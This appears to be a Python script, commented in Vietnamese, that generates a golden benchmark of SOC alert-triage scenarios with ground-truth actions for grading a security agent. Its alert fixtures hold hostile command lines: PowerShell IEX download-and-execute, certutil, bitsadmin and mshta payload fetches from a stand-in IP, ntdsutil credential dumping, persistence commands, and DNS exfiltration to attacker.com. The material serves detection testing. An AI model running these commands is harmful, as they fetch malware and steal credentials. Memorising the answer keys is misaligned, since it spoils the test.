"""golden/build_scenarios_v2.py — sinh golden/scenarios_v2.json (61 kịch bản vàng).

Bộ v2 dùng ĐÚNG title + level + attack_ids + surface từ rules/base/base_rules.csv.
Fields khớp detection trong YAML của rule.

Cơ cấu (số tự động tính khi chạy — xem output cuối script):
  - Khoảng 24–26 ca Splunk đúng (siem_correct=true)
  - Khoảng 36–38 ca Splunk sai (siem_correct=false — Agent phải sửa)
  - 24+ ca nhiều alert (kill-chain)

QUY ƯỚC correct_action — KHÔNG ĐƯỢC suy từ rule_level:
  Đáp án dựa vào TÌNH HUỐNG THỰC TẾ. Rule level chỉ là điểm khởi đầu.
  - Tấn công mức thấp (low) có ý đồ → vẫn review (không no_action)
  - Persistence thật (schtasks onlogon) → block dù rule gán low
  - Backup hợp lệ bị bắn nhầm → no_action dù rule gán medium

Quy ước mức → hành động:
  low      → no_action  (CHỈ khi thực sự lành tính)
  medium   → review
  high     → block
  critical → block

siem_correct TỰ ĐỘNG TÍNH: rule_level của alert CUỐI có khớp đáp án không.
Vì splunk_copy trong eval_golden.py lấy rule_level của alert cuối làm kết luận.
'information' coi là 'low'.

ĐÃ ĐỐI CHIẾU MẪU SPLUNK (rules/base/samples/, 02/10 — Claude sửa theo yêu cầu Hiếu):
  - Web: máy web của lab là Nginx (sourcetype nginx:aegis), Splunk gửi trường kiểu Nginx:
    method, uri (đường dẫn + query), status, http_user_agent, http_host, http_referer,
    body_bytes_sent; host = proxy01. 4 helper b01–b04 đã đổi từ tên IIS (cs-uri-query,
    cs(User-Agent)…) sang đúng tên này.
  - Endpoint: Sysmon qua Splunk dùng EventCode (KHÔNG phải EventID), có ComputerName,
    không có trường event_type → đã đổi ở mọi helper endpoint.
  - Mẫu thô của Splunk còn kèm trường nội bộ (_raw, _bkt, date_*, punct, splunk_server…)
    và giá trị nhiều lần (User là mảng) — đó là việc của bridge, bộ vàng mô phỏng alert
    SAU KHI bridge đã làm sạch.
  - Network: giữ nguyên dạng lồng (alert.signature, flow.*); Agent đọc được cả dạng lồng
    lẫn dạng chấm của Splunk (core/fields.py).
Tag bench-freeze-v2 sau khi Hiếu chốt các điểm còn mở (mẫu B05–B07, sơ đồ IP lab).

Chạy:  python golden/build_scenarios_v2.py
"""
import json
from pathlib import Path
from collections import Counter

OUT = Path(__file__).parent / "scenarios_v2.json"
T0 = "2026-09-27T01:00:00Z"


# ============ Helper dựng alert (10 trường hợp đồng 7.1) ============

def alert(aid, rule, level, ids, surface, ts, src, dst, dport, host, fields=None):
    return {
        "alert_id": aid, "rule_name": rule, "rule_level": level,
        "attack_ids": list(ids), "surface": surface, "timestamp": ts,
        "src_ip": src, "dest_ip": dst, "dest_port": dport, "host": host,
        "summary": f"{rule} | {src} -> {dst}:{dport} | host={host}",
        "fields": fields or {},
    }


def compute_siem_correct(gt_severity, alerts):
    """siem_correct = rule_level của alert CUỐI có khớp đáp án không.

    Vì splunk_copy lấy rule_level của alert cuối làm kết luận (eval_golden.py).
    'informational' coi là 'low'.
    """
    if not alerts:
        return False
    level = (alerts[-1].get("rule_level") or "").lower()
    if level == "informational":
        level = "low"
    return level == gt_severity


def scenario(sid, name, alerts, is_attack, severity, attack_ids, action, reason):
    """siem_correct TỰ TÍNH — không nhận từ tham số."""
    return {
        "id": sid, "name": name, "alerts": alerts,
        "ground_truth": {
            "is_attack": is_attack, "severity": severity,
            "attack_ids": list(attack_ids), "correct_action": action,
            "siem_correct": compute_siem_correct(severity, alerts),
            "reason": reason,
        },
    }


# ============ Helper cho từng rule — fields khớp detection YAML ============

# --- Nhóm WEB (logsource=webserver, surface=web) ---
# Trường theo mẫu Splunk thật (rules/base/samples/B01–B04.json, sourcetype nginx:aegis).

def _nginx_fields(method, uri, ua, http_host, status="200", body_bytes="896", referer=""):
    return {"method": method, "uri": uri, "status": status, "http_user_agent": ua,
            "http_host": http_host, "http_referer": referer, "body_bytes_sent": body_bytes}

def b01_sqli(aid, ts, src, dst="192.168.56.20", port=80,
             uri="/dvwa/?id=1%27+OR+%271%27%3D%271"):
    """B01 - SQL Injection Strings In URI (high, T1190)"""
    return alert(aid, "SQL Injection Strings In URI", "high", ["T1190"],
                 "web", ts, src, dst, port, "proxy01",
                 _nginx_fields("GET", uri, "sqlmap/1.7.2", dst))


def b02_path_traversal(aid, ts, src, dst="192.168.56.20", port=80,
                       uri="../../../../../etc/passwd"):
    """B02 - Path Traversal Exploitation Attempts (medium, T1190)"""
    return alert(aid, "Path Traversal Exploitation Attempts", "medium", ["T1190"],
                 "web", ts, src, dst, port, "proxy01",
                 _nginx_fields("GET", f"/download?file={uri}", "Mozilla/5.0", dst))


def b03_webshell_url(aid, ts, src, dst="192.168.56.20", port=80,
                     uri="=whoami"):
    """B03 - Windows Webshell Strings (high, T1505.003)"""
    return alert(aid, "Windows Webshell Strings", "high", ["T1505.003"],
                 "web", ts, src, dst, port, "proxy01",
                 _nginx_fields("GET", f"/upload/shell.aspx?{uri.lstrip('?')}", "curl/7.68", dst))


def b04_win_path_uri(aid, ts, src, dst="192.168.56.20", port=80,
                     uri="=C:/Windows/System32/cmd.exe"):
    """B04 - Suspicious Windows Strings In URI (high, T1505.003)"""
    return alert(aid, "Suspicious Windows Strings In URI", "high", ["T1505.003"],
                 "web", ts, src, dst, port, "proxy01",
                 _nginx_fields("GET", f"/api?{uri.lstrip('?')}", "Mozilla/5.0", dst))


# --- Nhóm WEBSHELL (surface=endpoint) ---

def b05_w3wp_spawn(aid, ts, host="web-win-01", child="cmd.exe",
                   cmdline="cmd.exe /c whoami"):
    """B05 - Suspicious Process By Web Server Process (high, T1505.003 T1190)"""
    return alert(aid, "Suspicious Process By Web Server Process", "high",
                 ["T1505.003", "T1190"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                  "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
                  "Image": f"C:\\Windows\\System32\\{child}",
                  "CommandLine": cmdline,
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6120", "ParentProcessId": "4892"})


def b06_webshell_recon(aid, ts, host="web-win-01",
                       cmdline="net user /domain"):
    """B06 - Webshell Detection With Command Line Keywords (high)"""
    return alert(aid, "Webshell Detection With Command Line Keywords", "high",
                 ["T1505.003", "T1018", "T1033", "T1087"], "endpoint",
                 ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                  "Image": "C:\\Windows\\System32\\net.exe",
                  "OriginalFileName": "net.exe",
                  "CommandLine": cmdline,
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6121", "ParentProcessId": "4892"})


def b07_webshell_hacking(aid, ts, host="web-win-01",
                         child="ntdsutil.exe", cmdline="ntdsutil ifm"):
    """B07 - Webshell Hacking Activity Patterns (high)"""
    return alert(aid, "Webshell Hacking Activity Patterns", "high",
                 ["T1505.003", "T1018", "T1033", "T1087"], "endpoint",
                 ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                  "Image": f"C:\\Windows\\System32\\{child}",
                  "CommandLine": cmdline,
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6122", "ParentProcessId": "4892"})


# --- Nhóm POWERSHELL ---

def b08_ps_encoded(aid, ts, host="web-win-01",
                   cmdline="powershell.exe -nop -w hidden -enc SQBFAFgA"):
    """B08 - Suspicious Encoded PowerShell Command Line (high, T1059.001)"""
    return alert(aid, "Suspicious Encoded PowerShell Command Line", "high",
                 ["T1059.001"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                  "OriginalFileName": "PowerShell.EXE",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6444", "ParentProcessId": "6120"})


def b09_ps_frombase64(aid, ts, host="web-win-01",
                      cmdline="powershell.exe [Convert]::FromBase64String('SQBFACAA')"):
    """B09 - Base64 Encoded PowerShell Command Detected (high, T1027 T1140 T1059.001)"""
    return alert(aid, "Base64 Encoded PowerShell Command Detected", "high",
                 ["T1027", "T1140", "T1059.001"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6445", "ParentProcessId": "6120"})


def b10_ps_download(aid, ts, host="web-win-01",
                    cmdline="powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/p.ps1')"):
    """B10 - Suspicious PowerShell Download and Execute Pattern (high, T1059.001)"""
    return alert(aid, "Suspicious PowerShell Download and Execute Pattern", "high",
                 ["T1059.001"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6446", "ParentProcessId": "6120"})


def b11_web_request(aid, ts, host="web-win-01",
                    cmdline="powershell.exe Invoke-WebRequest -Uri http://example.com",
                    user="DOMAIN\\admin"):
    """B11 - Usage Of Web Request Commands And Cmdlets (medium, T1059.001)"""
    return alert(aid, "Usage Of Web Request Commands And Cmdlets", "medium",
                 ["T1059.001"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\explorer.exe",
                  "User": user,
                  "ProcessId": "6501", "ParentProcessId": "5000"})


# --- Nhóm LOLBAS ---

def b12_certutil_download(aid, ts, host="web-win-01",
                          cmdline="certutil.exe -urlcache -split -f http://203.0.113.45/p.exe C:\\temp\\p.exe"):
    """B12 - Suspicious Download Via Certutil.EXE (medium, T1027 T1105)"""
    return alert(aid, "Suspicious Download Via Certutil.EXE", "medium",
                 ["T1027", "T1105"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\certutil.exe",
                  "OriginalFileName": "CertUtil.exe",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6220", "ParentProcessId": "6120"})


def b13_certutil_decode(aid, ts, host="web-win-01",
                        cmdline="certutil.exe -decode C:\\temp\\enc.txt C:\\temp\\dec.exe"):
    """B13 - File Decoded From Base64/Hex Via Certutil.EXE (high, T1027)"""
    return alert(aid, "File Decoded From Base64/Hex Via Certutil.EXE", "high",
                 ["T1027"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\certutil.exe",
                  "OriginalFileName": "CertUtil.exe",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6221", "ParentProcessId": "6120"})


def b14_bitsadmin(aid, ts, host="web-win-01",
                  cmdline="bitsadmin /transfer job http://203.0.113.45/p.exe C:\\temp\\p.exe"):
    """B14 - File Download Via Bitsadmin (medium, T1197 T1036.003 T1105)"""
    return alert(aid, "File Download Via Bitsadmin", "medium",
                 ["T1197", "T1036.003", "T1105"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\bitsadmin.exe",
                  "OriginalFileName": "bitsadmin.exe",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6222", "ParentProcessId": "6120"})


def b15_mshta(aid, ts, host="web-win-01",
              cmdline="mshta.exe http://203.0.113.45/payload.hta"):
    """B15 - Remotely Hosted HTA File Executed Via Mshta.EXE (high, T1218.005)"""
    return alert(aid, "Remotely Hosted HTA File Executed Via Mshta.EXE", "high",
                 ["T1218.005"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\mshta.exe",
                  "OriginalFileName": "MSHTA.EXE",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6223", "ParentProcessId": "6120"})


# --- Nhóm DISCOVERY ---

def b16_whoami_priv(aid, ts, host="web-win-01",
                    cmdline="whoami.exe /priv",
                    user="IIS APPPOOL\\DefaultAppPool"):
    """B16 - Security Privileges Enumeration Via Whoami.EXE (high, T1033)"""
    return alert(aid, "Security Privileges Enumeration Via Whoami.EXE", "high",
                 ["T1033"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\whoami.exe",
                  "OriginalFileName": "whoami.exe",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": user,
                  "ProcessId": "6124", "ParentProcessId": "6120"})


def b17_systeminfo(aid, ts, host="web-win-01",
                   user="IIS APPPOOL\\DefaultAppPool"):
    """B17 - Suspicious Execution of Systeminfo (low, T1082)"""
    return alert(aid, "Suspicious Execution of Systeminfo", "low",
                 ["T1082"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\systeminfo.exe",
                  "OriginalFileName": "sysinfo.exe",
                  "CommandLine": "systeminfo.exe",
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": user,
                  "ProcessId": "6125", "ParentProcessId": "6120"})


def b18_scan_loop(aid, ts, host="web-win-01",
                  cmdline="for i in 1 2 3; do ping 192.168.56.$i; done"):
    """B18 - Suspicious Scan Loop Network (medium, T1059 T1018)"""
    return alert(aid, "Suspicious Scan Loop Network", "medium",
                 ["T1059", "T1018"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\cmd.exe",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6126", "ParentProcessId": "6120"})


# --- Nhóm PERSISTENCE ---

def b19_schtasks(aid, ts, host="web-win-01",
                 cmdline="schtasks.exe /create /tn Updater /tr C:\\temp\\upd.exe /sc onlogon",
                 user="IIS APPPOOL\\DefaultAppPool"):
    """B19 - Scheduled Task Creation Via Schtasks.EXE (low, T1053.005)"""
    return alert(aid, "Scheduled Task Creation Via Schtasks.EXE", "low",
                 ["T1053.005"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\schtasks.exe",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": user,
                  "ProcessId": "6127", "ParentProcessId": "6120"})


def b20_schtasks_temp(aid, ts, host="web-win-01",
                      cmdline="schtasks.exe /create /tn Updater /tr C:\\Temp\\upd.exe /sc once /st 12:00"):
    """B20 - Suspicious Scheduled Task Creation Involving Temp Folder (high, T1053.005)"""
    return alert(aid, "Suspicious Scheduled Task Creation Involving Temp Folder", "high",
                 ["T1053.005"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\schtasks.exe",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": "IIS APPPOOL\\DefaultAppPool",
                  "ProcessId": "6128", "ParentProcessId": "6120"})


def b21_reg_run(aid, ts, host="web-win-01",
                cmdline='reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d C:\\temp\\x.exe',
                user="IIS APPPOOL\\DefaultAppPool"):
    """B21 - Potential Persistence Attempt Via Run Keys Using Reg.EXE (medium, T1547.001)"""
    return alert(aid, "Potential Persistence Attempt Via Run Keys Using Reg.EXE", "medium",
                 ["T1547.001"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Windows\\System32\\reg.exe",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": user,
                  "ProcessId": "6129", "ParentProcessId": "6120"})


# --- Nhóm LATERAL ---

def b22_psexec(aid, ts, host="web-win-01",
               cmdline="psexec.exe -accepteula \\\\192.168.56.50 cmd.exe",
               user="DOMAIN\\admin"):
    """B22 - Psexec Execution (medium, T1569 T1021)"""
    return alert(aid, "Psexec Execution", "medium",
                 ["T1569", "T1021"], "endpoint", ts, "", "", None, host,
                 {"EventCode": "1", "ComputerName": host,
                  "Image": "C:\\Users\\Public\\psexec.exe",
                  "OriginalFileName": "psexec.c",
                  "CommandLine": cmdline,
                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                  "User": user,
                  "ProcessId": "6130", "ParentProcessId": "6120"})


# --- Nhóm DNS (surface=network) ---

def b23_dns_b64(aid, ts, src="192.168.56.20", dst="8.8.8.8",
                query="dGVzdA==.attacker.com"):
    """B23 - Suspicious DNS Query with B64 Encoded String (medium, T1048.003 T1071.004)"""
    return alert(aid, "Suspicious DNS Query with B64 Encoded String", "medium",
                 ["T1048.003", "T1071.004"], "network", ts, src, dst, 53,
                 "sensor-net-01",
                 {"event_type": "dns", "proto": "UDP", "app_proto": "dns",
                  "query": query,
                  "flow": {"pkts_toserver": 5, "pkts_toclient": 5,
                           "bytes_toserver": 400, "bytes_toclient": 600,
                           "start": ts, "end": ts}})


def b24_dns_txt(aid, ts, src="192.168.56.20", dst="8.8.8.8",
                answer="IEX (New-Object Net.WebClient)"):
    """B24 - DNS TXT Answer with Possible Execution Strings (high, T1071.004)"""
    return alert(aid, "DNS TXT Answer with Possible Execution Strings", "high",
                 ["T1071.004"], "network", ts, src, dst, 53, "sensor-net-01",
                 {"event_type": "dns", "proto": "UDP", "app_proto": "dns",
                  "query": "cmd.example.com", "record_type": "TXT",
                  "answer": answer,
                  "flow": {"pkts_toserver": 3, "pkts_toclient": 3,
                           "bytes_toserver": 200, "bytes_toclient": 500,
                           "start": ts, "end": ts}})


def b25_cobalt_dns(aid, ts, src="192.168.56.20", dst="8.8.8.8",
                   query="aaa.stage.attacker.com"):
    """B25 - Cobalt Strike DNS Beaconing (critical, T1071.004)"""
    return alert(aid, "Cobalt Strike DNS Beaconing", "critical",
                 ["T1071.004"], "network", ts, src, dst, 53, "sensor-net-01",
                 {"event_type": "dns", "proto": "UDP", "app_proto": "dns",
                  "query": query,
                  "flow": {"pkts_toserver": 50, "pkts_toclient": 50,
                           "bytes_toserver": 5000, "bytes_toclient": 5000,
                           "start": ts, "end": ts}})


# --- Nhóm NETWORK custom (surface=network) ---

def c01_large_outbound(aid, ts, src="192.168.56.20", dst="203.0.113.45",
                       bytes_out=55000000):
    """C01 - Large Outbound Transfer From Web Server (medium, T1041 T1048)"""
    return alert(aid, "AegisSOC - Large Outbound Transfer From Web Server", "medium",
                 ["T1041", "T1048"], "network", ts, src, dst, 443, "sensor-net-01",
                 {"event_type": "flow", "proto": "TCP", "app_proto": "tls",
                  "src_ip": src, "dest_ip": dst,
                  "flow": {"pkts_toserver": 5000, "pkts_toclient": 5000,
                           "bytes_toserver": bytes_out, "bytes_toclient": 5000000,
                           "start": ts, "end": ts}})


def c02_suricata_c2(aid, ts, src="192.168.56.20", dst="203.0.113.45",
                    sig="ET MALWARE Possible C2 Beacon"):
    """C02 - Suricata Malware or C2 Communication Alert (high, T1071)"""
    return alert(aid, "AegisSOC - Suricata Malware or C2 Communication Alert",
                 "high", ["T1071"], "network", ts, src, dst, 8080, "sensor-net-01",
                 {"event_type": "alert", "proto": "TCP", "app_proto": "http",
                  "alert": {"signature": sig, "signature_id": 2030002,
                            "category": "A Network Trojan was detected"},
                  "flow": {"pkts_toserver": 40, "pkts_toclient": 40,
                           "bytes_toserver": 3200, "bytes_toclient": 2800,
                           "start": ts, "end": ts}})


def c03_suricata_scan(aid, ts, src, dst="192.168.56.20", dport=445,
                      sig="ET SCAN Possible TCP Port Scan"):
    """C03 - Suricata Network Scan Alert (medium, T1046 T1595)"""
    return alert(aid, "AegisSOC - Suricata Network Scan Alert", "medium",
                 ["T1046", "T1595"], "network", ts, src, dst, dport,
                 "sensor-net-01",
                 {"event_type": "alert", "proto": "TCP", "app_proto": "failed",
                  "alert": {"signature": sig, "signature_id": 2001219,
                            "category": "Attempted Information Leak"},
                  "flow": {"pkts_toserver": 1, "pkts_toclient": 0,
                           "bytes_toserver": 60, "bytes_toclient": 0,
                           "start": ts, "end": ts}})


# ============ 62 SCENARIO ============

SCENARIOS = []
T = lambda n: f"2026-09-27T01:{n:02d}:00Z"


# ==================== NHÓM 1 — CA SPLUNK ĐÚNG ====================

SCENARIOS += [
    # --- 5 ca WEB (B01-B04) ---
    scenario("v2-001", "SQLi rõ ràng từ IP ngoài", [
        b01_sqli("v2-001:w1", T(0), "203.0.113.45"),
    ], True, "high", ["T1190"], "block",
       "SQLi từ IP ngoài — B01 high, tình huống tấn công rõ → high/block."),

    scenario("v2-002", "SQLi UNION SELECT", [
        b01_sqli("v2-002:w1", T(1), "203.0.113.77",
                 uri="/search?q=1+UNION+SELECT+1,2,3--"),
    ], True, "high", ["T1190"], "block",
       "UNION SELECT là SQLi rõ — B01 high, tình huống nặng → high/block."),

    scenario("v2-003", "Path traversal /etc/passwd", [
        b02_path_traversal("v2-003:w1", T(2), "203.0.113.45"),
    ], True, "medium", ["T1190"], "review",
       "Path traversal đọc file hệ thống — B02 medium, cần review."),

    scenario("v2-004", "Webshell URL chứa whoami", [
        b03_webshell_url("v2-004:w1", T(3), "203.0.113.45"),
    ], True, "high", ["T1505.003"], "block",
       "URL webshell gọi whoami — B03 high, dấu hiệu RCE → high/block."),

    scenario("v2-005", "URI chứa C:/Windows path", [
        b04_win_path_uri("v2-005:w1", T(4), "203.0.113.45"),
    ], True, "high", ["T1505.003"], "block",
       "Chuỗi Windows path trong URI từ IP ngoài — B04 high → high/block."),

    # --- 4 ca WEBSHELL ---
    scenario("v2-006", "w3wp sinh cmd.exe /c whoami", [
        b05_w3wp_spawn("v2-006:e1", T(5)),
    ], True, "high", ["T1505.003", "T1190"], "block",
       "w3wp sinh cmd.exe từ IIS APPPOOL — webshell RCE. B05 high; tình huống "
       "không có dấu hiệu ứng dụng hợp lệ nào → high/block."),

    scenario("v2-007", "w3wp sinh powershell", [
        b05_w3wp_spawn("v2-007:e1", T(6), child="powershell.exe",
                       cmdline="powershell.exe -c Get-Process"),
    ], True, "high", ["T1505.003", "T1190"], "block",
       "w3wp sinh powershell — dấu hiệu webshell. B05 high → high/block."),

    scenario("v2-008", "Webshell chạy net user recon", [
        b06_webshell_recon("v2-008:e1", T(7), cmdline="net user /domain"),
    ], True, "high", ["T1505.003", "T1018", "T1033", "T1087"], "block",
       "net user /domain từ webshell — trinh sát tài khoản. B06 high → high/block."),

    scenario("v2-009", "Webshell dùng ntdsutil", [
        b07_webshell_hacking("v2-009:e1", T(8), child="ntdsutil.exe",
                             cmdline="ntdsutil ifm"),
    ], True, "high", ["T1505.003", "T1018", "T1033", "T1087"], "block",
       "ntdsutil từ webshell — credential dump. B07 high → high/block."),

    # --- 4 ca POWERSHELL ---
    scenario("v2-010", "PowerShell -enc từ cmd", [
        b08_ps_encoded("v2-010:e1", T(9)),
    ], True, "high", ["T1059.001"], "block",
       "PS -enc — mã hoá rõ ràng. B08 high → high/block."),

    scenario("v2-011", "PowerShell FromBase64String", [
        b09_ps_frombase64("v2-011:e1", T(10)),
    ], True, "high", ["T1027", "T1140", "T1059.001"], "block",
       "FromBase64String — decode payload. B09 high → high/block."),

    scenario("v2-012", "PowerShell IEX DownloadString", [
        b10_ps_download("v2-012:e1", T(11)),
    ], True, "high", ["T1059.001"], "block",
       "IEX DownloadString từ IP ngoài — stager. B10 high → high/block."),

    scenario("v2-013", "PowerShell Invoke-WebRequest (medium)", [
        b11_web_request("v2-013:e1", T(12)),
    ], True, "medium", ["T1059.001"], "review",
       "Invoke-WebRequest bởi DOMAIN\\admin — có thể cấu hình. B11 medium → review."),

    # --- 4 ca LOLBAS ---
    scenario("v2-014", "certutil -urlcache tải file", [
        b12_certutil_download("v2-014:e1", T(13)),
    ], True, "medium", ["T1027", "T1105"], "review",
       "certutil tải file từ IP ngoài — suspicious. B12 medium → review."),

    scenario("v2-015", "certutil -decode", [
        b13_certutil_decode("v2-015:e1", T(14)),
    ], True, "high", ["T1027"], "block",
       "certutil -decode là decode payload. B13 high → high/block."),

    scenario("v2-016", "bitsadmin /transfer tải file", [
        b14_bitsadmin("v2-016:e1", T(15)),
    ], True, "medium", ["T1197", "T1036.003", "T1105"], "review",
       "bitsadmin download — có thể lành tính. B14 medium → review."),

    scenario("v2-017", "mshta chạy HTA từ xa", [
        b15_mshta("v2-017:e1", T(16)),
    ], True, "high", ["T1218.005"], "block",
       "mshta http từ IP ngoài — remote HTA. B15 high → high/block."),

    # --- 3 ca DISCOVERY ---
    scenario("v2-018", "whoami /priv từ IIS APPPOOL", [
        b16_whoami_priv("v2-018:e1", T(17)),
    ], True, "high", ["T1033"], "block",
       "whoami /priv từ IIS APPPOOL — không phải user hợp lệ. B16 high → high/block."),

    # --- 3 ca PERSISTENCE ---
    scenario("v2-022", "schtasks chạy file trong Temp /sc once", [
        b20_schtasks_temp("v2-022:e1", T(21)),
    ], True, "high", ["T1053.005"], "block",
       "schtasks temp + /sc once — persistence nguy hiểm. B20 high → high/block."),

    # --- 1 ca LATERAL ---
    scenario("v2-023", "PsExec từ cmd tới host nội bộ", [
        b22_psexec("v2-023:e1", T(22),
                   cmdline="psexec.exe -accepteula \\\\192.168.56.50 cmd.exe",
                   user="IIS APPPOOL\\DefaultAppPool"),
    ], True, "medium", ["T1569", "T1021"], "review",
       "PsExec bởi IIS APPPOOL — không phải admin. B22 medium → review."),

    # --- 1 ca DNS ---
    scenario("v2-024", "DNS query chứa base64", [
        b23_dns_b64("v2-024:n1", T(23)),
    ], True, "medium", ["T1048.003", "T1071.004"], "review",
       "DNS query b64 từ web-win-01 — tunneling có thể. B23 medium → review."),

    # --- 1 ca NETWORK ---
    scenario("v2-025", "Suricata C2 beacon ra ngoài", [
        c02_suricata_c2("v2-025:n1", T(24)),
    ], True, "high", ["T1071"], "block",
       "Suricata ET MALWARE từ web-win-01 ra ngoài — C2. C02 high → high/block."),
]


# ==================== NHÓM 3 — SPLUNK GÁN THẤP (đưa lên đây cho gọn) ====================
# (Trước đây là v2-019, v2-021 — nay đổi thành ca Splunk gán thấp, ở giữa nhóm)

SCENARIOS += [
    scenario("v2-019", "systeminfo từ IIS APPPOOL (nghi trinh sát)", [
        b17_systeminfo("v2-019:e1", T(18)),
    ], True, "medium", ["T1082"], "review",
       "systeminfo từ IIS APPPOOL (user web, KHÔNG phải admin) là dấu hiệu trinh sát "
       "của webshell. Rule B17 gán low; tình huống thực tế cần review."),

    scenario("v2-021", "schtasks /sc onlogon — persistence thật", [
        b19_schtasks("v2-021:e1", T(20)),
    ], True, "high", ["T1053.005"], "block",
       "schtasks /create /sc onlogon chạy file trong C:\\temp là persistence thật, "
       "không phải quản trị. Rule B19 gán LOW; tình huống thực tế high/block."),
]


# ==================== NHÓM 2 — SPLUNK GÁN CAO (dùng inventory.yaml) ====================

SCENARIOS += [
    scenario("v2-026", "Máy quét IT quét cổng (báo nhầm)", [
        c03_suricata_scan("v2-026:n1", T(25), src="192.168.56.30", dport=80),
        c03_suricata_scan("v2-026:n2", T(26), src="192.168.56.30", dport=443),
    ], False, "low", ["T1046", "T1595"], "no_action",
       "IP 192.168.56.30 là it_scanner trong inventory — quét định kỳ hợp lệ. "
       "Rule C03 gán medium; tình huống thực tế low/no_action."),

    scenario("v2-027", "LB monitor health check (báo nhầm)", [
        c03_suricata_scan("v2-027:n1", T(27), src="192.168.56.5", dport=80),
        c03_suricata_scan("v2-027:n2", T(28), src="192.168.56.5", dport=443),
        c03_suricata_scan("v2-027:n3", T(29), src="192.168.56.5", dport=8080),
    ], False, "low", ["T1046", "T1595"], "no_action",
       "IP 192.168.56.5 là lb_monitor — health check định kỳ. "
       "Rule C03 gán medium; tình huống thực tế low/no_action."),

    scenario("v2-028", "Admin chạy whoami /priv giờ hành chính", [
        b16_whoami_priv("v2-028:e1", T(30), user="DOMAIN\\admin"),
    ], False, "low", ["T1033"], "no_action",
       "DOMAIN\\admin dùng admin tools giờ hành chính (inventory note). "
       "Rule B16 gán high; tình huống thực tế low/no_action."),

    scenario("v2-029", "Admin chạy systeminfo", [
        b17_systeminfo("v2-029:e1", T(31), user="DOMAIN\\admin"),
    ], False, "low", ["T1082"], "no_action",
       "DOMAIN\\admin — systeminfo là hoạt động admin bình thường. "
       "Rule B17 gán low; đáp án khớp mức luật."),

    scenario("v2-030", "Admin chạy PsExec tới host quản trị", [
        b22_psexec("v2-030:e1", T(32),
                   cmdline="psexec.exe -accepteula \\\\192.168.56.50 cmd.exe",
                   user="DOMAIN\\admin"),
    ], False, "low", ["T1569", "T1021"], "no_action",
